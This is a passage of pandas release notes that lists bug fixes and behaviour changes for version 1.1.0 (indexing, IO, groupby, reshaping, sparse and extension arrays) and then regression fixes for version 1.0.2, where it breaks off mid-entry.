(:issue:`32995`)\n- Bug in :meth:`DataFrame.corr` and :meth:`DataFrame.cov` raising when handling nullable integer columns with ``pandas.NA`` (:issue:`33803`)\n- Bug in arithmetic operations between :class:`DataFrame` objects with non-overlapping columns with duplicate labels causing an infinite loop (:issue:`35194`)\n- Bug in :class:`DataFrame` and :class:`Series` addition and subtraction between object-dtype objects and ``datetime64`` dtype objects (:issue:`33824`)\n- Bug in :meth:`Index.difference` giving incorrect results when comparing a :class:`Float64Index` and object :class:`Index` (:issue:`35217`)\n- Bug in :class:`DataFrame` reductions (e.g. ``df.min()``, ``df.max()``) with ``ExtensionArray`` dtypes (:issue:`34520`, :issue:`32651`)\n- :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` now raise a ValueError if ``limit_direction`` is ``'forward'`` or ``'both'`` and ``method`` is ``'backfill'`` or ``'bfill'`` or ``limit_direction`` is ``'backward'`` or ``'both'`` and ``method`` is ``'pad'`` or ``'ffill'`` (:issue:`34746`)\n\nConversion\n^^^^^^^^^^\n- Bug in :class:`Series` construction from NumPy array with big-endian ``datetime64`` dtype (:issue:`29684`)\n- Bug in :class:`Timedelta` construction with large nanoseconds keyword value (:issue:`32402`)\n- Bug in :class:`DataFrame` construction where sets would be duplicated rather than raising (:issue:`32582`)\n- The :class:`DataFrame` constructor no longer accepts a list of :class:`DataFrame` objects. Because of changes to NumPy, :class:`DataFrame` objects are now consistently treated as 2D objects, so a list of :class:`DataFrame` objects is considered 3D, and no longer acceptable for the :class:`DataFrame` constructor (:issue:`32289`).\n- Bug in :class:`DataFrame` when initiating a frame with lists and assign ``columns`` with nested list for ``MultiIndex`` (:issue:`32173`)\n- Improved error message for invalid construction of list when creating a new index (:issue:`35190`)\n\n\nStrings\n^^^^^^^\n\n- Bug in the :meth:`~Series.astype` method when converting \"string\" dtype data to nullable integer dtype (:issue:`32450`).\n- Fixed issue where taking ``min`` or ``max`` of a ``StringArray`` or ``Series`` with ``StringDtype`` type would raise. (:issue:`31746`)\n- Bug in :meth:`Series.str.cat` returning ``NaN`` output when other had :class:`Index` type (:issue:`33425`)\n- :func:`pandas.api.dtypes.is_string_dtype` no longer incorrectly identifies categorical series as string.\n\nInterval\n^^^^^^^^\n- Bug in :class:`IntervalArray` incorrectly allowing the underlying data to be changed when setting values (:issue:`32782`)\n\nIndexing\n^^^^^^^^\n\n- :meth:`DataFrame.xs` now raises a  ``TypeError`` if a ``level`` keyword is supplied and the axis is not a :class:`MultiIndex`. Previously an ``AttributeError`` was raised (:issue:`33610`)\n- Bug in slicing on a :class:`DatetimeIndex` with a partial-timestamp dropping high-resolution indices near the end of a year, quarter, or month (:issue:`31064`)\n- Bug in :meth:`PeriodIndex.get_loc` treating higher-resolution strings differently from :meth:`PeriodIndex.get_value` (:issue:`31172`)\n- Bug in :meth:`Series.at` and :meth:`DataFrame.at` not matching ``.loc`` behavior when looking up an integer in a :class:`Float64Index` (:issue:`31329`)\n- Bug in :meth:`PeriodIndex.is_monotonic` incorrectly returning ``True`` when containing leading ``NaT`` entries (:issue:`31437`)\n- Bug in :meth:`DatetimeIndex.get_loc` raising ``KeyError`` with converted-integer key instead of the user-passed key (:issue:`31425`)\n- Bug in :meth:`Series.xs` incorrectly returning ``Timestamp`` instead of ``datetime64`` in some object-dtype cases (:issue:`31630`)\n- Bug in :meth:`DataFrame.iat` incorrectly returning ``Timestamp`` instead of ``datetime`` in some object-dtype cases (:issue:`32809`)\n- Bug in :meth:`DataFrame.at` when either columns or index is non-unique (:issue:`33041`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` when indexing with an integer key on a object-dtype :class:`Index` that is not all-integers (:issue:`31905`)\n- Bug in :meth:`DataFrame.iloc.__setitem__` on a :class:`DataFrame` with duplicate columns incorrectly setting values for all matching columns (:issue:`15686`, :issue:`22036`)\n- Bug in :meth:`DataFrame.loc` and :meth:`Series.loc` with a :class:`DatetimeIndex`, :class:`TimedeltaIndex`, or :class:`PeriodIndex` incorrectly allowing lookups of non-matching datetime-like dtypes (:issue:`32650`)\n- Bug in :meth:`Series.__getitem__` indexing with non-standard scalars, e.g. ``np.dtype`` (:issue:`32684`)\n- Bug in :class:`Index` constructor where an unhelpful error message was raised for NumPy scalars (:issue:`33017`)\n- Bug in :meth:`DataFrame.lookup` incorrectly raising an ``AttributeError`` when ``frame.index`` or ``frame.columns`` is not unique; this will now raise a ``ValueError`` with a helpful error message (:issue:`33041`)\n- Bug in :class:`Interval` where a :class:`Timedelta` could not be added or subtracted from a :class:`Timestamp` interval (:issue:`32023`)\n- Bug in :meth:`DataFrame.copy` not invalidating _item_cache after copy caused post-copy value updates to not be reflected (:issue:`31784`)\n- Fixed regression in :meth:`DataFrame.loc` and :meth:`Series.loc` throwing an error when a ``datetime64[ns, tz]`` value is provided (:issue:`32395`)\n- Bug in :meth:`Series.__getitem__` with an integer key and a :class:`MultiIndex` with leading integer level failing to raise ``KeyError`` if the key is not present in the first level (:issue:`33355`)\n- Bug in :meth:`DataFrame.iloc` when slicing a single column :class:`DataFrame` with ``ExtensionDtype`` (e.g. ``df.iloc[:, :1]``) returning an invalid result (:issue:`32957`)\n- Bug in :meth:`DatetimeIndex.insert` and :meth:`TimedeltaIndex.insert` causing index ``freq`` to be lost when setting an element into an empty :class:`Series` (:issue:`33573`)\n- Bug in :meth:`Series.__setitem__` with an :class:`IntervalIndex` and a list-like key of integers (:issue:`33473`)\n- Bug in :meth:`Series.__getitem__` allowing missing labels with ``np.ndarray``, :class:`Index`, :class:`Series` indexers but not ``list``, these now all raise ``KeyError`` (:issue:`33646`)\n- Bug in :meth:`DataFrame.truncate` and :meth:`Series.truncate` where index was assumed to be monotone increasing (:issue:`33756`)\n- Indexing with a list of strings representing datetimes failed on :class:`DatetimeIndex` or :class:`PeriodIndex` (:issue:`11278`)\n- Bug in :meth:`Series.at` when used with a :class:`MultiIndex` would raise an exception on valid inputs (:issue:`26989`)\n- Bug in :meth:`DataFrame.loc` with dictionary of values changes columns with dtype of ``int`` to ``float`` (:issue:`34573`)\n- Bug in :meth:`Series.loc` when used with a :class:`MultiIndex` would raise an ``IndexingError`` when accessing a ``None`` value (:issue:`34318`)\n- Bug in :meth:`DataFrame.reset_index` and :meth:`Series.reset_index` would not preserve data types on an empty :class:`DataFrame` or :class:`Series` with a :class:`MultiIndex` (:issue:`19602`)\n- Bug in :class:`Series` and :class:`DataFrame` indexing with a ``time`` key on a :class:`DatetimeIndex` with ``NaT`` entries (:issue:`35114`)\n\nMissing\n^^^^^^^\n- Calling :meth:`fillna` on an empty :class:`Series` now correctly returns a shallow copied object. The behaviour is now consistent with :class:`Index`, :class:`DataFrame` and a non-empty :class:`Series` (:issue:`32543`).\n- Bug in :meth:`Series.replace` when argument ``to_replace`` is of type dict/list and is used on a :class:`Series` containing ``<NA>`` was raising a ``TypeError``. The method now handles this by ignoring ``<NA>`` values when doing the comparison for the replacement (:issue:`32621`)\n- Bug in :meth:`~Series.any` and :meth:`~Series.all` incorrectly returning ``<NA>`` for all ``False`` or all ``True`` values using the nulllable Boolean dtype and with ``skipna=False`` (:issue:`33253`)\n- Clarified documentation on interpolate with ``method=akima``. The ``der`` parameter must be scalar or ``None`` (:issue:`33426`)\n- :meth:`DataFrame.interpolate` uses the correct axis convention now. Previously interpolating along columns lead to interpolation along indices and vice versa. Furthermore interpolating with methods ``pad``, ``ffill``, ``bfill`` and ``backfill`` are identical to using these methods with :meth:`DataFrame.fillna` (:issue:`12918`, :issue:`29146`)\n- Bug in :meth:`DataFrame.interpolate` when called on a :class:`DataFrame` with column names of string type was throwing a ValueError. The method is now independent of the type of the column names (:issue:`33956`)\n- Passing :class:`NA` into a format string using format specs will now work. For example ``\"{:.1f}\".format(pd.NA)`` would previously raise a ``ValueError``, but will now return the string ``\"<NA>\"`` (:issue:`34740`)\n- Bug in :meth:`Series.map` not raising on invalid ``na_action`` (:issue:`32815`)\n\nMultiIndex\n^^^^^^^^^^\n\n- :meth:`DataFrame.swaplevels` now raises a ``TypeError`` if the axis is not a :class:`MultiIndex`. Previously an ``AttributeError`` was raised (:issue:`31126`)\n- Bug in :meth:`Dataframe.loc` when used with a :class:`MultiIndex`. The returned values were not in the same order as the given inputs (:issue:`22797`)\n\n.. ipython:: python\n\n        df = pd.DataFrame(np.arange(4),\n                          index=[[\"a\", \"a\", \"b\", \"b\"], [1, 2, 1, 2]])\n         Rows are now ordered as the requested keys\n        df.loc[(['b', 'a'], [2, 1]), :]\n\n- Bug in :meth:`MultiIndex.intersection` was not guaranteed to preserve order when ``sort=False``. (:issue:`31325`)\n- Bug in :meth:`DataFrame.truncate` was dropping :class:`MultiIndex` names. (:issue:`34564`)\n\n.. ipython:: python\n\n        left = pd.MultiIndex.from_arrays([[\"b\", \"a\"], [2, 1]])\n        right = pd.MultiIndex.from_arrays([[\"a\", \"b\", \"c\"], [1, 2, 3]])\n         Common elements are now guaranteed to be ordered by the left side\n        left.intersection(right, sort=False)\n\n- Bug when joining two :class:`MultiIndex` without specifying level with different columns. Return-indexers parameter was ignored. (:issue:`34074`)\n\nIO\n^^\n- Passing a ``set`` as ``names`` argument to :func:`pandas.read_csv`, :func:`pandas.read_table`, or :func:`pandas.read_fwf` will raise ``ValueError: Names should be an ordered collection.`` (:issue:`34946`)\n- Bug in print-out when ``display.precision`` is zero. (:issue:`20359`)\n- Bug in :func:`read_json` where integer overflow was occurring when json contains big number strings. (:issue:`30320`)\n- :func:`read_csv` will now raise a ``ValueError`` when the arguments ``header`` and ``prefix`` both are not ``None``. (:issue:`27394`)\n- Bug in :meth:`DataFrame.to_json` was raising ``NotFoundError`` when ``path_or_buf`` was an S3 URI (:issue:`28375`)\n- Bug in :meth:`DataFrame.to_parquet` overwriting pyarrow's default for\n  ``coerce_timestamps``; following pyarrow's default allows writing nanosecond\n  timestamps with ``version=\"2.0\"`` (:issue:`31652`).\n- Bug in :func:`read_csv` was raising ``TypeError`` when ``sep=None`` was used in combination with ``comment`` keyword (:issue:`31396`)\n- Bug in :class:`HDFStore` that caused it to set to ``int64`` the dtype of a ``datetime64`` column when reading a :class:`DataFrame` in Python 3 from fixed format written in Python 2 (:issue:`31750`)\n- :func:`read_sas()` now handles dates and datetimes larger than :attr:`Timestamp.max` returning them as :class:`datetime.datetime` objects (:issue:`20927`)\n- Bug in :meth:`DataFrame.to_json` where ``Timedelta`` objects would not be serialized correctly with ``date_format=\"iso\"`` (:issue:`28256`)\n- :func:`read_csv` will raise a ``ValueError`` when the column names passed in ``parse_dates`` are missing in the :class:`Dataframe` (:issue:`31251`)\n- Bug in :func:`read_excel` where a UTF-8 string with a high surrogate would cause a segmentation violation (:issue:`23809`)\n- Bug in :func:`read_csv` was causing a file descriptor leak on an empty file (:issue:`31488`)\n- Bug in :func:`read_csv` was causing a segfault when there were blank lines between the header and data rows (:issue:`28071`)\n- Bug in :func:`read_csv` was raising a misleading exception on a permissions issue (:issue:`23784`)\n- Bug in :func:`read_csv` was raising an ``IndexError`` when ``header=None`` and two extra data columns\n- Bug in :func:`read_sas` was raising an ``AttributeError`` when reading files from Google Cloud Storage (:issue:`33069`)\n- Bug in :meth:`DataFrame.to_sql` where an ``AttributeError`` was raised when saving an out of bounds date (:issue:`26761`)\n- Bug in :func:`read_excel` did not correctly handle multiple embedded spaces in OpenDocument text cells. (:issue:`32207`)\n- Bug in :func:`read_json` was raising ``TypeError`` when reading a ``list`` of Booleans into a :class:`Series`. (:issue:`31464`)\n- Bug in :func:`pandas.io.json.json_normalize` where location specified by ``record_path`` doesn't point to an array. (:issue:`26284`)\n- :func:`pandas.read_hdf` has a more explicit error message when loading an\n  unsupported HDF file (:issue:`9539`)\n- Bug in :meth:`~DataFrame.read_feather` was raising an ``ArrowIOError`` when reading an s3 or http file path (:issue:`29055`)\n- Bug in :meth:`~DataFrame.to_excel` could not handle the column name ``render`` and was raising an ``KeyError`` (:issue:`34331`)\n- Bug in :meth:`~SQLDatabase.execute` was raising a ``ProgrammingError`` for some DB-API drivers when the SQL statement contained the ``%`` character and no parameters were present (:issue:`34211`)\n- Bug in :meth:`~pandas.io.stata.StataReader` which resulted in categorical variables with different dtypes when reading data using an iterator. (:issue:`31544`)\n- :meth:`HDFStore.keys` has now an optional ``include`` parameter that allows the retrieval of all native HDF5 table names (:issue:`29916`)\n- ``TypeError`` exceptions raised by :func:`read_csv` and :func:`read_table` were showing as ``parser_f`` when an unexpected keyword argument was passed (:issue:`25648`)\n- Bug in :func:`read_excel` for ODS files removes 0.0 values (:issue:`27222`)\n- Bug in :func:`ujson.encode` was raising an ``OverflowError`` with numbers larger than ``sys.maxsize`` (:issue:`34395`)\n- Bug in :meth:`HDFStore.append_to_multiple` was raising a ``ValueError`` when the ``min_itemsize`` parameter is set (:issue:`11238`)\n- Bug in :meth:`~HDFStore.create_table` now raises an error when ``column`` argument was not specified in ``data_columns`` on input (:issue:`28156`)\n- :func:`read_json` now could read line-delimited json file from a file url while ``lines`` and ``chunksize`` are set.\n- Bug in :meth:`DataFrame.to_sql` when reading DataFrames with ``-np.inf`` entries with MySQL now has a more explicit ``ValueError`` (:issue:`34431`)\n- Bug where capitalised files extensions were not decompressed by read_* functions (:issue:`35164`)\n- Bug in :meth:`read_excel` that was raising a ``TypeError`` when ``header=None`` and ``index_col`` is given as a ``list`` (:issue:`31783`)\n- Bug in :func:`read_excel` where datetime values are used in the header in a :class:`MultiIndex` (:issue:`34748`)\n- :func:`read_excel` no longer takes ``**kwds`` arguments. This means that passing in the keyword argument ``chunksize`` now raises a ``TypeError`` (previously raised a ``NotImplementedError``), while passing in the keyword argument ``encoding`` now raises a ``TypeError`` (:issue:`34464`)\n- Bug in :meth:`DataFrame.to_records` was incorrectly losing timezone information in timezone-aware ``datetime64`` columns (:issue:`32535`)\n\nPlotting\n^^^^^^^^\n\n- :meth:`DataFrame.plot` for line/bar now accepts color by dictionary (:issue:`8193`).\n- Bug in :meth:`DataFrame.plot.hist` where weights are not working for multiple columns (:issue:`33173`)\n- Bug in :meth:`DataFrame.boxplot` and :meth:`DataFrame.plot.boxplot` lost color attributes of ``medianprops``, ``whiskerprops``, ``capprops`` and ``boxprops`` (:issue:`30346`)\n- Bug in :meth:`DataFrame.hist` where the order of ``column`` argument was ignored (:issue:`29235`)\n- Bug in :meth:`DataFrame.plot.scatter` that when adding multiple plots with different ``cmap``, colorbars always use the first ``cmap`` (:issue:`33389`)\n- Bug in :meth:`DataFrame.plot.scatter` was adding a colorbar to the plot even if the argument ``c`` was assigned to a column containing color names (:issue:`34316`)\n- Bug in :meth:`pandas.plotting.bootstrap_plot` was causing cluttered axes and overlapping labels (:issue:`34905`)\n- Bug in :meth:`DataFrame.plot.scatter` caused an error when plotting variable marker sizes (:issue:`32904`)\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Using a :class:`pandas.api.indexers.BaseIndexer` with ``count``, ``min``, ``max``, ``median``, ``skew``,  ``cov``, ``corr`` will now return correct results for any monotonic :class:`pandas.api.indexers.BaseIndexer` descendant (:issue:`32865`)\n- :meth:`DataFrameGroupby.mean` and :meth:`SeriesGroupby.mean` (and similarly for :meth:`~DataFrameGroupby.median`, :meth:`~DataFrameGroupby.std` and :meth:`~DataFrameGroupby.var`) now raise a ``TypeError`` if a non-accepted keyword argument is passed into it. Previously an ``UnsupportedFunctionCall`` was raised (``AssertionError`` if ``min_count`` passed into :meth:`~DataFrameGroupby.median`) (:issue:`31485`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` raising ``ValueError`` when the ``by`` axis is not sorted, has duplicates, and the applied ``func`` does not mutate passed in objects (:issue:`30667`)\n- Bug in :meth:`DataFrameGroupBy.transform` produces an incorrect result with transformation functions (:issue:`30918`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` were returning the wrong result when grouping by multiple keys of which some were categorical and others not (:issue:`32494`)\n- Bug in :meth:`.DataFrameGroupBy.count` and :meth:`.SeriesGroupBy.count` causing segmentation fault when grouped-by columns contain NaNs (:issue:`32841`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` produces inconsistent type when aggregating Boolean :class:`Series` (:issue:`32894`)\n- Bug in :meth:`DataFrameGroupBy.sum` and :meth:`SeriesGroupBy.sum` where a large negative number would be returned when the number of non-null values was below ``min_count`` for nullable integer dtypes (:issue:`32861`)\n- Bug in :meth:`SeriesGroupBy.quantile` was raising on nullable integers (:issue:`33136`)\n- Bug in :meth:`DataFrame.resample` where an ``AmbiguousTimeError`` would be raised when the resulting timezone aware :class:`DatetimeIndex` had a DST transition at midnight (:issue:`25758`)\n- Bug in :meth:`DataFrame.groupby` where a ``ValueError`` would be raised when grouping by a categorical column with read-only categories and ``sort=False`` (:issue:`33410`)\n- Bug in :meth:`.DataFrameGroupBy.agg`, :meth:`.SeriesGroupBy.agg`, :meth:`.DataFrameGroupBy.transform`, :meth:`.SeriesGroupBy.transform`, :meth:`.DataFrameGroupBy.resample`, and :meth:`.SeriesGroupBy.resample` where subclasses are not preserved (:issue:`28330`)\n- Bug in :meth:`SeriesGroupBy.agg` where any column name was accepted in the named aggregation of :class:`SeriesGroupBy` previously. The behaviour now allows only ``str`` and callables else would raise ``TypeError``. (:issue:`34422`)\n- Bug in :meth:`DataFrame.groupby` lost the name of the :class:`Index` when one of the ``agg`` keys referenced an empty list (:issue:`32580`)\n- Bug in :meth:`Rolling.apply` where ``center=True`` was ignored when ``engine='numba'`` was specified (:issue:`34784`)\n- Bug in :meth:`DataFrame.ewm.cov` was throwing ``AssertionError`` for :class:`MultiIndex` inputs (:issue:`34440`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.quantile` raised ``TypeError`` for non-numeric types rather than dropping the columns (:issue:`27892`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.transform` when ``func='nunique'`` and columns are of type ``datetime64``, the result would also be of type ``datetime64`` instead of ``int64`` (:issue:`35109`)\n- Bug in :meth:`DataFrame.groupby` raising an ``AttributeError`` when selecting a column and aggregating with ``as_index=False`` (:issue:`35246`).\n- Bug in :meth:`DataFrameGroupBy.first` and :meth:`DataFrameGroupBy.last` that would raise an unnecessary ``ValueError`` when grouping on multiple ``Categoricals`` (:issue:`34951`)\n\nReshaping\n^^^^^^^^^\n\n- Bug effecting all numeric and Boolean reduction methods not returning subclassed data type. (:issue:`25596`)\n- Bug in :meth:`DataFrame.pivot_table` when only :class:`MultiIndexed` columns is set (:issue:`17038`)\n- Bug in :meth:`DataFrame.unstack` and :meth:`Series.unstack` can take tuple names in :class:`MultiIndexed` data (:issue:`19966`)\n- Bug in :meth:`DataFrame.pivot_table` when ``margin`` is ``True`` and only ``column`` is defined (:issue:`31016`)\n- Fixed incorrect error message in :meth:`DataFrame.pivot` when ``columns`` is set to ``None``. (:issue:`30924`)\n- Bug in :func:`crosstab` when inputs are two :class:`Series` and have tuple names, the output will keep a dummy :class:`MultiIndex` as columns. (:issue:`18321`)\n- :meth:`DataFrame.pivot` can now take lists for ``index`` and ``columns`` arguments (:issue:`21425`)\n- Bug in :func:`concat` where the resulting indices are not copied when ``copy=True`` (:issue:`29879`)\n- Bug in :meth:`SeriesGroupBy.aggregate` was resulting in aggregations being overwritten when they shared the same name (:issue:`30880`)\n- Bug where :meth:`Index.astype` would lose the :attr:`name` attribute when converting from ``Float64Index`` to ``Int64Index``, or when casting to an ``ExtensionArray`` dtype (:issue:`32013`)\n- :meth:`Series.append` will now raise a ``TypeError`` when passed a :class:`DataFrame` or a sequence containing :class:`DataFrame` (:issue:`31413`)\n- :meth:`DataFrame.replace` and :meth:`Series.replace` will raise a ``TypeError`` if ``to_replace`` is not an expected type. Previously the ``replace`` would fail silently (:issue:`18634`)\n- Bug on inplace operation of a :class:`Series` that was adding a column to the :class:`DataFrame` from where it was originally dropped from (using ``inplace=True``) (:issue:`30484`)\n- Bug in :meth:`DataFrame.apply` where callback was called with :class:`Series` parameter even though ``raw=True`` requested. (:issue:`32423`)\n- Bug in :meth:`DataFrame.pivot_table` losing timezone information when creating a :class:`MultiIndex` level from a column with timezone-aware dtype (:issue:`32558`)\n- Bug in :func:`concat` where when passing a non-dict mapping as ``objs`` would raise a ``TypeError`` (:issue:`32863`)\n- :meth:`DataFrame.agg` now provides more descriptive ``SpecificationError`` message when attempting to aggregate a non-existent column (:issue:`32755`)\n- Bug in :meth:`DataFrame.unstack` when :class:`MultiIndex` columns and :class:`MultiIndex` rows were used (:issue:`32624`, :issue:`24729` and :issue:`28306`)\n- Appending a dictionary to a :class:`DataFrame` without passing ``ignore_index=True`` will raise ``TypeError: Can only append a dict if ignore_index=True`` instead of ``TypeError: Can only append a :class:`Series` if ignore_index=True or if the :class:`Series` has a name`` (:issue:`30871`)\n- Bug in :meth:`DataFrame.corrwith()`, :meth:`DataFrame.memory_usage()`, :meth:`DataFrame.dot()`,\n  :meth:`DataFrame.idxmin()`, :meth:`DataFrame.idxmax()`, :meth:`DataFrame.duplicated()`, :meth:`DataFrame.isin()`,\n  :meth:`DataFrame.count()`, :meth:`Series.explode()`, :meth:`Series.asof()` and :meth:`DataFrame.asof()` not\n  returning subclassed types. (:issue:`31331`)\n- Bug in :func:`concat` was not allowing for concatenation of :class:`DataFrame` and :class:`Series` with duplicate keys (:issue:`33654`)\n- Bug in :func:`cut` raised an error when the argument ``labels`` contains duplicates (:issue:`33141`)\n- Ensure only named functions can be used in :func:`eval()` (:issue:`32460`)\n- Bug in :meth:`Dataframe.aggregate` and :meth:`Series.aggregate` was causing a recursive loop in some cases (:issue:`34224`)\n- Fixed bug in :func:`melt` where melting :class:`MultiIndex` columns with ``col_level > 0`` would raise a ``KeyError`` on ``id_vars`` (:issue:`34129`)\n- Bug in :meth:`Series.where` with an empty :class:`Series` and empty ``cond`` having non-bool dtype (:issue:`34592`)\n- Fixed regression where :meth:`DataFrame.apply` would raise ``ValueError`` for elements with ``S`` dtype (:issue:`34529`)\n\nSparse\n^^^^^^\n- Creating a :class:`SparseArray` from timezone-aware dtype will issue a warning before dropping timezone information, instead of doing so silently (:issue:`32501`)\n- Bug in :meth:`arrays.SparseArray.from_spmatrix` wrongly read scipy sparse matrix (:issue:`31991`)\n- Bug in :meth:`Series.sum` with ``SparseArray`` raised a ``TypeError`` (:issue:`25777`)\n- Bug where :class:`DataFrame` containing an all-sparse :class:`SparseArray` filled with ``NaN`` when indexed by a list-like (:issue:`27781`, :issue:`29563`)\n- The repr of :class:`SparseDtype` now includes the repr of its ``fill_value`` attribute. Previously it used ``fill_value``'s  string representation (:issue:`34352`)\n- Bug where empty :class:`DataFrame` could not be cast to :class:`SparseDtype` (:issue:`33113`)\n- Bug in :meth:`arrays.SparseArray` was returning the incorrect type when indexing a sparse dataframe with an iterable (:issue:`34526`, :issue:`34540`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Fixed bug where :meth:`Series.value_counts` would raise on empty input of ``Int64`` dtype (:issue:`33317`)\n- Fixed bug in :func:`concat` when concatenating :class:`DataFrame` objects with non-overlapping columns resulting in object-dtype columns rather than preserving the extension dtype (:issue:`27692`, :issue:`33027`)\n- Fixed bug where :meth:`StringArray.isna` would return ``False`` for NA values when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`33655`)\n- Fixed bug in :class:`Series` construction with EA dtype and index but no data or scalar data fails (:issue:`26469`)\n- Fixed bug that caused :meth:`Series.__repr__()` to crash for extension types whose elements are multidimensional arrays (:issue:`33770`).\n- Fixed bug where :meth:`Series.update` would raise a ``ValueError`` for ``ExtensionArray`` dtypes with missing values (:issue:`33980`)\n- Fixed bug where :meth:`StringArray.memory_usage` was not implemented (:issue:`33963`)\n- Fixed bug where :meth:`DataFrameGroupBy` would ignore the ``min_count`` argument for aggregations on nullable Boolean dtypes (:issue:`34051`)\n- Fixed bug where the constructor of :class:`DataFrame` with ``dtype='string'`` would fail (:issue:`27953`, :issue:`33623`)\n- Bug where :class:`DataFrame` column set to scalar extension type was considered an object type rather than the extension type (:issue:`34832`)\n- Fixed bug in :meth:`IntegerArray.astype` to correctly copy the mask as well (:issue:`34931`).\n\nOther\n^^^^^\n\n- Set operations on an object-dtype :class:`Index` now always return object-dtype results (:issue:`31401`)\n- Fixed :func:`pandas.testing.assert_series_equal` to correctly raise if the ``left`` argument is a different subclass with ``check_series_type=True`` (:issue:`32670`).\n- Getting a missing attribute in a :meth:`DataFrame.query` or :meth:`DataFrame.eval` string raises the correct ``AttributeError`` (:issue:`32408`)\n- Fixed bug in :func:`pandas.testing.assert_series_equal` where dtypes were checked for ``Interval`` and ``ExtensionArray`` operands when ``check_dtype`` was ``False`` (:issue:`32747`)\n- Bug in :meth:`DataFrame.__dir__` caused a segfault when using unicode surrogates in a column name (:issue:`25509`)\n- Bug in :meth:`DataFrame.equals` and :meth:`Series.equals` in allowing subclasses to be equal (:issue:`34402`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.5..v1.1.0|HEAD\n\n\n.. _whatsnew_102:\n\nWhat's new in 1.0.2 (March 12, 2020)\n------------------------------------\n\nThese are the changes in pandas 1.0.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_102.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n**Groupby**\n\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` which were failing on frames with :class:`MultiIndex` columns and a custom function (:issue:`31777`)\n- Fixed regression in ``groupby(..).rolling(..).apply()`` (``RollingGroupby``) where the ``raw`` parameter was ignored (:issue:`31754`)\n- Fixed regression in :meth:`rolling(..).corr() <.Rolling.corr>` when using a time offset (:issue:`31789`)\n- Fixed regression in :meth:`groupby(..).nunique() <.DataFrameGroupBy.nunique>` which was modifying the original values if ``NaN`` values were present (:issue:`31950`)\n- Fixed regression in ``DataFrame.groupby`` raising a ``ValueError`` from an internal operation (:issue:`31802`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` calling a user-provided function an extra time on an empty input (:issue:`31760`)\n\n**I/O**\n\n- Fixed regression in :meth:`read_csv` in which the ``encoding`` option was not recognized with certain file-like objects (:issue:`31819`)\n- Fixed regression in :meth:`DataFrame.to_excel` when the ``columns`` keyword argument is passed (:issue:`31677`)\n- Fixed regression in :class:`ExcelFile` where the stream passed into the function was closed by the destructor. (:issue:`31467`)\n- Fixed regression where :func:`read_pickle` raised a ``UnicodeDecodeError`` when reading a py27 pickle with :class:`MultiIndex` column (:issue:`31988`).\n\n**Reindexing/alignment**\n\n- Fixed regression in :meth:`Series.align` when ``other`` is a :class:`DataFrame` and ``method`` is not ``None`` (:issue:`31785`)\n- Fixed regression in :meth:`DataFrame.reindex` and :meth:`Series.reindex` when reindexing with (tz-aware) index and ``method=nearest`` (:issue:`26683`)\n- Fixed regression in :meth:`DataFrame.reindex_like` on a :class:`DataFrame` subclass raised an  ``AssertionError`` (:issue:`31925`)\n- Fixed regression in :class:`DataFrame` arithmetic operations with mis-matched columns (:issue:`31623`)\n\n**Other**\n\n- Fixed regression in joining on :class:`DatetimeIndex` or :class:`TimedeltaIndex` to preserve ``freq`` in simple cases (:issue:`32166`)\n- Fixed regression in :meth:`Series.shift` with ``datetime64`` dtype when passing an integer ``fill_value`` (:issue:`32591`)\n- Fixed regression in the repr of an object-dtype :class:`Index` with bools and missing values (:issue:`32146`)\n\n\n.. ---------------------------------------------------------------------------\n\nIndexing with nullable boolean arrays\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPreviously indexing with a nullable Boolean array containing ``NA`` would raise a ``ValueError``, however this is now permitted with ``NA`` being treated as ``False``. (:issue:`31503`)\n\n.. ipython:: python\n\n    s = pd.Series([1, 2, 3, 4])\n    mask = pd.array([True, True, False, None], dtype=\"boolean\")\n    s\n    mask\n\n*pandas 1.0.0-1.0.1*\n\n.. code-block:: python\n\n    >>> s[mask]\n    Traceback (most recent call last):\n    ...\n    ValueError: cannot mask with array containing NA / NaN values\n\n*pandas 1.0.2*\n\n.. ipython:: python\n\n    s[mask]\n\n.. _whatsnew_102.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**Datetimelike**\n\n- Bug in :meth:`Series.astype` not copying for tz-naive and tz-aware ``datetime64`` dtype (:issue:`32490`)\n- Bug where :func:`to_datetime` would raise when passed ``pd.NA`` (:issue:`32213`)\n- Improved error message when subtracting two :class:`Timestamp` that result in an out-of-bounds :class:`Timedelta` (:issue:`31774`)\n\n**Categorical**\n\n- Fixed bug where :meth:`Categorical.from_codes` improperly raised a ``ValueError`` when passed nullable integer codes. (:issue:`31779`)\n- Fixed bug where :meth:`Categorical` constructor would raise a ``TypeError`` when given a numpy array containing ``pd.NA``. (:issue:`31927`)\n- Bug in :class:`Categorical` that would ignore or crash when calling :meth:`Series.replace` with a list-like ``to_replace`` (:issue:`31720`)\n\n**I/O**\n\n- Using ``pd.NA`` with :meth:`DataFrame.to_json` now correctly outputs a null value instead of an empty object (:issue:`31615`)\n- Bug in :meth:`pandas.json_normalize` when value in meta path is not iterable (:issue:`31507`)\n- Fixed pickling of ``pandas.NA``. Previously a new object was returned, which broke computations relying on ``NA`` being a singleton (:issue:`31847`)\n- Fixed bug in parquet roundtrip with nullable unsigned integer dtypes (:issue:`31896`).\n\n**Experimental dtypes**\n\n- Fixed bug in :meth:`DataFrame.convert_dtypes` for columns that were already using the ``\"string\"`` dtype (:issue:`31731`).\n- Fixed bug in :meth:`DataFrame.convert_dtypes` for series with mix of integers and 